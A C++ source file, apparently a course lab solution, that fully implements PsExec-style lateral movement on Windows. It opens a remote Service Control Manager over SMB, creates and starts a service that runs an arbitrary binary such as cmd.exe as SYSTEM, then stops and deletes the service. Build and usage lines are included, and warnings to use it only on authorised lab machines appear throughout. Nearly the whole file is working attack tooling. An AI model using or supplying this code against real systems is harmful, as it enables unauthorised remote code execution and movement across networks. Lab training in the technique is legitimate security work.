/*
  Solution 03 — Remote Service Installer (PsExec Pattern)
  ---------------------------------------------------------
  Complete implementation showing how PsExec-style lateral movement works:
    1. Connect to the remote machine's Service Control Manager over SMB.
    2. Create a service pointing to an executable already on the remote host.
    3. Start the service (runs as SYSTEM on the remote machine).
    4. Poll until RUNNING or timeout.
    5. Stop and delete the service when done.

  Prerequisite: your account must be in the remote machine's local
  Administrators group (or you have valid admin credentials).

  IMPORTANT: Only use against machines you own or have written permission to test.

  Compile:
    g++ -std=c++17 -Wall -o sol03.exe sol03_remote_service.cpp -ladvapi32
  Usage:
    sol03.exe <target_ip> <service_name> <bin_path>
    sol03.exe 192.168.1.100 RemoteTestSvc "C:\\Windows\\System32\\cmd.exe"
*/

#include <windows.h>
#include <string>
#include <cstdio>

// ---- installRemoteService ----
// Opens the remote SCM, creates the service, returns the SCM handle on success.
bool installRemoteService(const std::string& targetIp,
                           const std::string& serviceName,
                           const std::string& displayName,
                           const std::string& binPath,
                           SC_HANDLE* phScmOut) {
    *phScmOut = nullptr;

    // Connect to the remote Service Control Manager
    SC_HANDLE hScm = OpenSCManagerA(
        targetIp.c_str(),
        SERVICES_ACTIVE_DATABASE,
        SC_MANAGER_ALL_ACCESS);
    if (!hScm) {
        printf("[-] OpenSCManagerA(%s): %lu\n", targetIp.c_str(), GetLastError());
        printf("    Ensure you have admin rights on the target and SMB (445) is reachable.\n");
        return false;
    }
    printf("[+] Connected to remote SCM on %s\n", targetIp.c_str());

    // Create the service (or open if it already exists)
    SC_HANDLE hSvc = CreateServiceA(
        hScm,
        serviceName.c_str(),
        displayName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,  // don't fail boot if service fails to start
        binPath.c_str(),
        nullptr,   // no load-ordering group
        nullptr,   // no tag ID
        nullptr,   // no dependencies
        nullptr,   // LocalSystem account
        nullptr    // no password
    );

    if (!hSvc) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            printf("[*] Service already exists — opening existing service\n");
            hSvc = OpenServiceA(hScm, serviceName.c_str(), SERVICE_ALL_ACCESS);
        }
        if (!hSvc) {
            printf("[-] CreateServiceA / OpenServiceA: %lu\n", GetLastError());
            CloseServiceHandle(hScm);
            return false;
        }
    }
    printf("[+] Service created/opened: %s -> %s\n",
           serviceName.c_str(), binPath.c_str());

    CloseServiceHandle(hSvc);
    *phScmOut = hScm;
    return true;
}

// ---- startRemoteService ----
// Opens and starts the service, polls until RUNNING or timeout.
bool startRemoteService(SC_HANDLE hScm, const std::string& serviceName) {
    SC_HANDLE hSvc = OpenServiceA(hScm, serviceName.c_str(),
                                   SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hSvc) {
        printf("[-] OpenServiceA for start: %lu\n", GetLastError());
        return false;
    }

    if (!StartServiceA(hSvc, 0, nullptr)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[-] StartServiceA: %lu\n", err);
            CloseServiceHandle(hSvc);
            return false;
        }
        printf("[*] Service was already running\n");
    }

    // Poll until RUNNING or 30-second timeout
    SERVICE_STATUS_PROCESS ssp = {};
    DWORD needed = 0;
    for (int i = 0; i < 30; i++) {
        QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                             (LPBYTE)&ssp, sizeof(ssp), &needed);
        if (ssp.dwCurrentState == SERVICE_RUNNING) {
            printf("[+] Service RUNNING (PID=%lu)\n", ssp.dwProcessId);
            CloseServiceHandle(hSvc);
            return true;
        }
        if (ssp.dwCurrentState == SERVICE_STOPPED) {
            printf("[-] Service stopped unexpectedly\n");
            break;
        }
        printf("[*] State: %lu — waiting...\n", ssp.dwCurrentState);
        Sleep(1000);
    }

    printf("[-] Timed out waiting for service to start\n");
    CloseServiceHandle(hSvc);
    return false;
}

// ---- stopAndDeleteService ----
// Stops the service, waits for STOPPED, then deletes it.
bool stopAndDeleteService(SC_HANDLE hScm, const std::string& serviceName) {
    SC_HANDLE hSvc = OpenServiceA(
        hScm, serviceName.c_str(),
        SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
    if (!hSvc) {
        printf("[-] OpenServiceA for delete: %lu\n", GetLastError());
        return false;
    }

    // Send stop control
    SERVICE_STATUS ss = {};
    if (ControlService(hSvc, SERVICE_CONTROL_STOP, &ss)) {
        printf("[*] Stop signal sent. Waiting...\n");
        // Wait up to 10 seconds for STOPPED
        for (int i = 0; i < 10; i++) {
            SERVICE_STATUS_PROCESS ssp = {};
            DWORD needed = 0;
            QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                                 (LPBYTE)&ssp, sizeof(ssp), &needed);
            if (ssp.dwCurrentState == SERVICE_STOPPED) {
                printf("[+] Service stopped\n");
                break;
            }
            Sleep(1000);
        }
    } else {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_NOT_ACTIVE) {
            printf("[!] ControlService(STOP): %lu (proceeding to delete)\n", err);
        }
    }

    // Delete the service
    bool ok = DeleteService(hSvc) == TRUE;
    if (ok)
        printf("[+] Service deleted: %s\n", serviceName.c_str());
    else
        printf("[-] DeleteService: %lu\n", GetLastError());

    CloseServiceHandle(hSvc);
    return ok;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        printf("Usage: %s <target_ip> <service_name> <bin_path>\n", argv[0]);
        printf("  Example: %s 192.168.1.100 RemoteTestSvc \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n",
               argv[0]);
        printf("\n  IMPORTANT: Only use against machines you own/have permission to test.\n");
        return 1;
    }

    const char* targetIp    = argv[1];
    const char* serviceName = argv[2];
    const char* binPath     = argv[3];
    std::string displayName = std::string(serviceName) + " (lateral movement lab)";

    printf("[*] Target:  %s\n", targetIp);
    printf("[*] Service: %s\n", serviceName);
    printf("[*] Binary:  %s\n", binPath);
    printf("[*] IMPORTANT: Only run this against lab VMs you own.\n\n");

    SC_HANDLE hScm = nullptr;
    if (!installRemoteService(targetIp, serviceName, displayName, binPath, &hScm)) {
        printf("[-] installRemoteService failed\n");
        return 1;
    }

    printf("[*] Starting service...\n");
    bool started = startRemoteService(hScm, serviceName);

    printf("[*] Cleaning up (stop + delete)...\n");
    stopAndDeleteService(hScm, serviceName);

    CloseServiceHandle(hScm);

    if (started)
        printf("[+] Complete: service ran and was cleaned up\n");
    else
        printf("[-] Service failed to start but cleanup was attempted\n");

    return started ? 0 : 1;
}
